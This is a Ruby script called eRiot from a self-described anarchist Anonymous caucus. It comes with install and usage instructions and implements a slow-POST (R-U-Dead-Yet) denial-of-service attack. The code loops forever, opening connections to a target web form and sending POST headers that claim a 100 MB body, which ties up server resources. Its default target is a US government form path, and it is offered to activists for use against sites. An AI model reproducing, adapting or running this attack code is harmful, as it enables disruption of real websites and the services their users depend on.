#!/usr/bin/ruby
# Anon Anarchist Action (an anarchist caucus inside anonymous)
# find us in the i2p shadownet IRC channels #aaa #AnonAnarchistAction #anonops
# https://aaa.status.net http://www.youtube.com/user/netanarchist

# HOW TO USE
# This version of eRiot uses a web form attack called r-u-dead-yet
# there is a working and more mature python script called rudy
# also a document called OWASP-Universal-HTTP-DoS
# this script is very far from finish if you are serious about testing 
# consider using rudy instead.
# well for those few that may have no idea on how to run a shell script,  
# you need to install ruby1.9.x  apt-get install ruby1.9 
# you need also to install flags a ruby library
# sudo gem install flags
# then chmod 700 eriot_r-u-dead-yet.rb 
# and to run do: ruby eriot.rb or ./eriot.rb with parameter -target targerhost.org/form/path  
# remember you have to point it to a form and again this script is far from finish.
# to stop for now just ctrl+c 


require 'socket'
require 'flags'
require 'uri'

# this script will at some point connect to an account on a torrent or identi.ca/status.net or 
# maybe IRC to get the site name, port and DOS method, there will be a "alone" option were the
# activist can add their own information with out connecting to the head

# maybe future use shoes for UI
# https://github.com/ashbb/shoes_tutorial_walkthrough

Flags.define_string(:target, "http://us.gov/path/to/form", "Here you add target URL to the site form")
#Flags.define_int(:port, 80, "Target port")

if __FILE__ == $0

Flags.init

uri = URI::parse(Flags.target)

loop {
  Socket.tcp(uri.host, "80") do |sock|
    sock.print "POST #{uri.path} HTTP/1.1\r\nHost: #{uri.host}\r\nConnection: keep-alive\r\nContent-Length: 100000000\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n\r\n"
#    sock.close_write
#    puts sock.read
  end
}
end
